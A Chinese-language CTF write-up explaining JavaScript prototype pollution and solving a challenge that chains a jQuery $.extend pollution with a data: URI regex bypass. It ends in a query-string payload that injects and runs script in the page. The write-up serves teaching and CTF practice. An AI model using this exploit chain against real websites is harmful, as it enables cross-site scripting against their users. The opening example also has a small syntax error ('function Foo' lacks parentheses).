categories:
- web
tags:
- ctf
title: js原型链污染
---
# js原型链污染

 https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html 

## 什么是原型链

 每个实例对象（ object ）都有一个私有属性（称之为 __proto__ ）指向它的构造函数的原型对象（**prototype** ）。该原型对象也有一个自己的原型对象( __proto__ ) ，层层向上直到一个对象的原型对象为 `null`。根据定义，`null` 没有原型，并作为这个**原型链**中的最后一个环节。 



```javascript
function Foo
{
    
    this.a="456";
    this.c="777"
}
Foo.prototype.b="123";
Foo.prototype.c="789";
var foo=new Foo();
console.log(foo.a);//456	
console.log(foo.b);//123
console.log(foo.c);//777
```





当在当前对象找不到属性或方法时便会向上(`__proto__`中)寻找

1. 在对象foo中寻找b
2. 如果找不到，则在`foo.__proto__`中寻找b
3. 如果仍然找不到，则继续在`foo.__proto__.__proto__`中寻找b
4. 依次寻找，直到找到`null`结束。比如，`Object.prototype`的`__proto__`就是`null`



JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。

以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：

1. 每个构造函数(constructor)都有一个原型对象(prototype)
2. 对象的`__proto__`属性，指向类的原型对象`prototype`
3. JavaScript使用prototype链实现继承机制

## 什么时原型链污染

当我们修改对象的`__proto__`属性时,就相当于修改对象的父类

当调用不存在的方法或属性时便会在父类中寻找,就变相的控制了这个类

```javascript
let foo = {bar: 1}

// foo.bar 此时为1
console.log(foo.bar)

// 修改foo的原型（即Object）
foo.__proto__.bar = 2

// 由于查找顺序的原因，foo.bar仍然是1
console.log(foo.bar)

// 此时再用Object创建一个空的zoo对象
let zoo = {}

// 查看zoo.bar
console.log(zoo.bar)
```

## 哪些情况原型链会被污染

### merge

### clone

### JSON.parse

### jQuery.extend

*$*.extend( target [, object1 ] [, objectN ] )

指示是否深度合并

*$*.extend( [deep ], target, object1 [, objectN ] )

**警告:** 不支持第一个参数传递 false 。

| 参数      | 描述                                                         |
| :-------- | :----------------------------------------------------------- |
| *deep*    | 可选。 Boolean类型 指示是否深度合并对象，默认为false。如果该值为true，且多个对象的某个同名属性也都是对象，则该"属性对象"的属性也将进行合并。 |
| *target*  | Object类型 目标对象，其他对象的成员属性将被附加到该对象上。  |
| *object1* | 可选。 Object类型 第一个被合并的对象。                       |
| *objectN* | 可选。 Object类型 第N个被合并的对象。                        |



## 例题

题目代码

car.class.js

```javascript
class Car {
    constructor(type, model, color, pic, key="") {
        this.type = type
        this.model = model
        this.color = color
        this.key = key
        this.pic = pic

        let started = false
        this.start = () => {
            started = true
        }
        this.isStarted = () => {
            return started
        }
    }
    powerOn() {
        if (this.isStarted()) {
            infobox(`Well Done!`)
            nextCar()

        } else {
            $('.chargeup')[0].play()
        }
    }
    info() {
        infobox(`This car is a ${this.type} ${this.model} in ${this.color}. It looks very nice! But it seems to be broken ...`)
    }
    repair() {
        if(urlParams.has('repair')) {
            $.extend(true, this, JSON.parse(urlParams.get('repair')))
        }
    }
    light() {
        infobox(`You turn on the lights ... Nothing happens.`)
    }
    battery() {
        infobox(`Hmmm, the battery is almost empty ... Maybe i can repair this somehow.`)
    }
    ignition() {
        if (this.key == "") {
            infobox(`Looks like the key got lost. No wonder the car is not starting ...`)
        }
        if (this.key == "🔑") {
            infobox(`The car started!`)
            this.start()
        }
    }
}
```



util.js

```javascript
const urlParams = new URLSearchParams(window.location.search)
const h = location.hash.slice(1)
const bugatti = new Car('Bugatti', 'T35', 'green', 'assets/images/bugatti.png')
const porsche = new Car('Porsche', '911', 'yellow', 'assets/images/porsche.png')

const cars = [bugatti, porsche]

porsche.repair = () => {
    if(!bugatti.isStarted()){
        infobox(`Not so fast. Repair the other car first!`)
    }
    else if($.md5(porsche) == '9cdfb439c7876e703e307864c9167a15'){
        if(urlParams.has('help')) {
            repairWithHelper(urlParams.get('help'))
        }
    }
    else{
        infobox(`Repairing this is not that easy.`)
    }
}
porsche.ignition = () => {
    infobox(`Hmm ... WTF!`)
}

$(document).ready(() => {
    const [car] = cars
    $('.fa-power-off').click(() => car.powerOn())
    $('.fa-car').click(() => car.info())
    $('.fa-lightbulb-o').click(() => car.light())
    $('.fa-battery-quarter').click(() => car.battery())
    $('.fa-key').click(() => car.ignition())
    $('.fa-wrench').click(() => car.repair())
    
    $('.fa-step-forward').click(() => nextCar())

    if(h.includes('Bugatti'))
        autoStart(bugatti)
    if(h.includes('Porsche'))
        autoStart(porsche)
})


const nextCar = () => {
    cars.push(cars.shift())
    $(".image").attr('src', cars[0].pic);
}


const autoStart = (car) => {
    car.repair()
    car.ignition()
    car.powerOn()
}


const repairWithHelper = (src) => {
    /* who needs csp anyways !? */
    urlRegx = /^\w{4,5}:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/;
    if (urlRegx.test(src)) {
        let s = document.createElement('script')
        s.src = src
        $('head').append(s)
    }
}


const infobox = (text) => {
    $('a').css({'pointer-events': 'none', 'border': 'none'})
    $('.infobox').addClass('infoAnimate')
        .text(text)
        .on('animationend', function() {
            $(this).removeClass('infoAnimate')
            $('a').css({'pointer-events': 'all', 'border': 'solid 1px rgba(255, 255, 255, .25)'})
    })
    
}
```

阅读代码发现car类的repair方法会调用

`$.extend(true, this, JSON.parse(urlParams.get('repair')))
        `

可以进行原型链污染

而这一题我们的目标时进行xss

阅读代码发现对象`porsche`的repairWithHelper中可以进行xss

而调用repairWithHelper方法就需要调用porsche的repair方法

```
if($.md5(porsche) == '9cdfb439c7876e703e307864c9167a15'){
        if(urlParams.has('help')) {
            repairWithHelper(urlParams.get('help'))
        }
}
```

我们用控制porsche.toString()=='lol'(lol的md5是9cdfb439c7876e703e307864c9167a15)，我们可以通过原型链污染来让上层为`['lol']`(['lol'].toString()=='lol')



通过autoStart来调用bugatti.repair(原型链污染)和porsche.repair(调用repairWithHelper方法)

所以构造payload:`http://127.0.0.1/?repair={"started":true,"__proto__":{"__proto__":["lol"]}} `



接下来就是利用repairWithHelper来进行xss

```javascript
const repairWithHelper = (src) => {
    /* who needs csp anyways !? */
    urlRegx = /^\w{4,5}:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/;
    if (urlRegx.test(src)) {
        let s = document.createElement('script')
        s.src = src
        $('head').append(s)
    }
}
```

虽然这里对url的域名进行了限制不能远程文件包含

但是我们可以利用data协议来绕过正则从而直接执行命令

data协议格式

```
data:[<mime type>][;charset=<charset>][;base64],<encoded data>
```

最后的payload:` http://127.0.0.1/?repair={"key":"🔑","__proto__":{"__proto__":["lol"]}}&help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/asdfsdf/asdf,alert("123")%23.js#BugattiPorsche`

